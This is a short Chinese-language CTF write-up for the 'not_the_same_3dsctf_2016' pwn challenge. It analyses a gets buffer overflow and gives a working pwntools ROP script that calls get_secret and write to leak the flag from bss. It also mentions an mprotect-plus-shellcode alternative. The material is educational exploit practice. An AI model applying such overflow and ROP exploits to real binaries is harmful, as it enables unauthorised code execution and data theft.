检查安全机制

![image-20201102192917583](https://static.hack1s.fun/images/2021/02/06/image-20201102192917583.png)

只开启了NX

main函数主要是一个gets输入

![image-20201102193648677](https://static.hack1s.fun/images/2021/02/06/image-20201102193648677.png)

看到这个v4和ebp存在0x2d的距离



搜索字符串发现有一个`flag.txt`

查找reference找到这样一个`get_secret`函数

![image-20201102193257668](https://static.hack1s.fun/images/2021/02/06/image-20201102193257668.png)

这个函数首先打开了文件`flag.txt`，之后用`fgets`从`v0`句柄读内容到`fl4g`这段内存空间

`fl4g`位于bss段

![image-20201102201744573](https://static.hack1s.fun/images/2021/02/06/image-20201102201744573.png)



有了这些内容，我们想要构造的应该就是这样一个调用链：首先溢出控制返回地址，覆盖返回地址填写为`get_secret`函数，这个函数执行完毕之后会在bss段`fl4g`处写入`flag.txt`的内容；

之后利用rop调用write函数读出来这个地方的值；

```python
from pwn import *

io = remote('node3.buuoj.cn',25072)

elf = ELF('./not_the_same_3dsctf_2016')
#io = process('./not_the_same_3dsctf_2016')

get_secret = 0x080489a0
bss = 0x080eca2d
payload = 'a'*0x2d + p32(get_secret) + p32(elf.sym['write']) + p32(bss) + p32(1) + p32(bss) + p32(45)

io.sendline(payload)

io.interactive()
```

和之前那道题目类似，这个题目也存在另一种解法

就是使用mprotect修改bss段的权限，之后再跳转到写在bss段的shellcode

